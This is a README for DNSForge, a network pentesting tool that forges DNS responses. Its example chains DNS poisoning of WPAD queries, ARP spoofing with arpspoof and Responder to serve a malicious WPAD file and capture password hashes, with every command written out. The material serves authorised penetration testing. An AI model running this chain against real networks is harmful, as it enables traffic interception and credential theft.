# DNSForge
---
DNSForge is a network pentesting tool that aims to forge DNS responses as if they were originating from the authoritative nameserver. This tool is intended to be used alongside [Responder](https://github.com/lgandx/Responder) and [arpspoof](https://linux.die.net/man/8/arpspoof).

## Installation
---
The dependencies can be installed using [Poetry](https://python-poetry.org/)
```
poetry install
poetry shell
```

## Usage
---
```
usage: dnsforge.py [-h] --interface INTERFACE --dns-server DNS_SERVER --query-name QUERY_NAME --poison-ip POISON_IP

DNS Response Forger

options:
  -h, --help            show this help message and exit
  --interface INTERFACE, -i INTERFACE
                        Interface to sniff/poison on
  --dns-server DNS_SERVER, -d DNS_SERVER
                        IP address of Authoritative DNS Server
  --query-name QUERY_NAME, -qn QUERY_NAME
                        DNS Query Name to Poison
  --poison-ip POISON_IP, -p POISON_IP
                        IP address of to poison with
```

## Example
---
Sample scenario of poisoning DNS requests for WPAD issued by victim host:
1. Setup DNS Forge to poison incoming requests
```sudo python3 dnsforge.py -d <DNS Server> -i <Interface> -qn wpad -p <Poison IP>```
2. Once the signature for the authoritative nameserver is captured, spoof ARP requests
```sudo arpspoof -i <Interface> <DNS Server>```
3. Finally, run Responder to serve malicious WPAD file and capture hashes
```sudo responder -I <Interface> -wFP```